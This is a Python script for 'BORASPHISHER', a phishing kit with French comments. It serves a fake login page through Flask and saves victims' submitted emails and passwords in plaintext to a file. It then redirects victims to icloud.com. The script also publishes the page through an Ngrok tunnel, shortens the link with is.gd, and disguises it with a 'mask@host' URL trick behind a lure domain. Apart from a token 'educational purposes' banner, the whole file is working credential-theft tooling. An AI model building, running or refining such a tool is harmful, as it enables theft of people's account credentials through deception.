import os
import subprocess
import time
import requests
from flask import Flask, request, render_template, redirect

# Codes de couleur ANSI
GREEN = "\033[32m"
CYAN = "\033[36m"
RED = "\033[31m"
RESET = "\033[0m"

def display_banner():
    print(f"{GREEN}BORASPHISHER{RESET}")
    print(f"{CYAN}Created by oussamabtk | Version 1.0{RESET}")
    print(f"{RED}Use this tool responsibly and only for educational purposes.{RESET}\n")

app = Flask(__name__)

# Dossier pour stocker les informations capturées
if not os.path.exists("captured"):
    os.makedirs("captured")


# Page de phishing
@app.route("/")
def index():
    return render_template("index.html")


# Route pour capturer les informations
@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("login_email")
    password = request.form.get("login_password")

    if email or password:
        # Enregistrer les informations dans un fichier
        with open("captured/credentials.txt", "a") as f:
            f.write(f"Email: {email}, Password: {password}\n")
        print(f"{GREEN}[+] Informations capturées : Email={email}, Password={password}{RESET}")
    else:
        print(f"{RED}[!] Aucune information capturée.{RESET}")

    # Rediriger l'utilisateur vers une page légitime
    return redirect("https://www.icloud.com/")


# Démarrer Ngrok pour obtenir un lien public
def start_ngrok():
    # Chemin vers Ngrok (standard sous Linux)
    ngrok_path = "/usr/local/bin/ngrok"

    if not os.path.exists(ngrok_path):
        print(f"{RED}[!] Ngrok n'est pas installé. Veuillez l'installer.{RESET}")
        exit(1)

    print(f"{GREEN}[+] Démarrage de Ngrok...{RESET}")
    ngrok_process = subprocess.Popen(
        [ngrok_path, 'http', '8080'],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )

    # Attendre que Ngrok démarre (augmentez le délai si nécessaire)
    time.sleep(10)

    headers = {
    "ngrok-skip-browser-warning": "true",  # Ajout de l'en-tête personnalisé
    "User-Agent": "CustomUserAgent"       # Optionnel : ajout d'un User-Agent personnalisé
    }

    # Utiliser l'API Ngrok pour récupérer le lien public
    try:
        response = requests.get("http://127.0.0.1:4040/api/tunnels",headers=headers, timeout=10)
        if response.status_code == 200:
            public_url = response.json()["tunnels"][0]["public_url"]
            print(f"{GREEN}[+] Lien public Ngrok : {CYAN}{public_url}{RESET}")
            return public_url
        else:
            print(f"{RED}[!] Impossible de se connecter à l'API Ngrok. Code d'état : {response.status_code}{RESET}")
            exit(1)
    except requests.exceptions.RequestException as e:
        print(f"{RED}[!] Erreur lors de la récupération du lien public Ngrok : {e}{RESET}")
        exit(1)


# Démarrer le serveur Flask
def start_flask():
    print(f"{GREEN}[+] Démarrage du serveur Flask...{RESET}")
    app.run(host="0.0.0.0", port=8080, debug=False)  # Désactiver le mode debug pour éviter les redémarrages

# set mask----------------------------------------

def shorten_url(url):
    """
    Raccourcit une URL en utilisant le service is.gd.
    :param url: L'URL originale (ex: https://example.com)
    :return: L'URL raccourcie ou None si le service échoue
    """
    service = "https://is.gd/create.php?format=simple&url="  # Service is.gd

    try:
        # Envoyer une requête au service de raccourcissement
        response = requests.get(f"{service}{url}")
        if response.status_code == 200:
            # Retourner l'URL raccourcie
            return response.text.strip()
        else:
            print(f"{RED}Erreur avec {service} : Code d'état {response.status_code}{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{RED}Erreur avec {service} : {e}{RESET}")

    # Si le service échoue
    print("{RED}Le service de raccourcissement d'URL is.gd a échoué.{RESET}")
    return None

# applique le mask

def apply_custom_mask(url, mask):
    """
    Applique un masque personnalisé à une URL.
    :param url: L'URL originale (ex: https://example.com)
    :param mask: Le masque personnalisé (ex: https://get-free-followers.com)
    :return: L'URL masquée
    """
    # Supprimer le protocole (http:// ou https://) de l'URL et du masque
    clean_url = url.replace("http://", "").replace("https://", "")
    clean_mask = mask.replace("http://", "").replace("https://", "")

    # Combiner le masque et l'URL
    masked_url = f"https://{clean_mask}@{clean_url}"
    return masked_url


# Fonction principale
def main():

    # Afficher le banner
    display_banner()
    # Démarrer Ngrok et obtenir le lien public
    public_url = start_ngrok()
    # Démarrer le serveur Flask
    start_flask()

    if public_url:
        # Afficher le lien public
        print(f"{GREEN}[+] Votre page est accessible à l'adresse : {CYAN}{public_url}{RESET}")

        # Raccourcir l'URL avec le service is.gd
        shortened_url = shorten_url(public_url)
        if not shortened_url:
            print("Impossible de raccourcir l'URL. Utilisation de l'URL originale.")
            shortened_url = public_url

        # Demander à l'utilisateur le masque personnalisé
        mask = input(f"{GREEN}Entrez le masque personnalisé (ex: https://get-free-followers.com) : {RESET}").strip()

        # Appliquer le masque
        masked_url = apply_custom_mask(shortened_url, mask)

        # Afficher le lien public masked
        print(f"{GREEN}[+] Votre lien raccourcir est accessible à l'adresse : {CYAN}{masked_url}{RESET}")
     
    else:
        print(f"{RED}[!] Impossible de démarrer Ngrok. Vérifiez votre configuration.{RESET}")


if __name__ == "__main__":
    # Démarrer Ngrok une seule fois
    if os.environ.get("WERKZEUG_RUN_MAIN") != "true":
        main()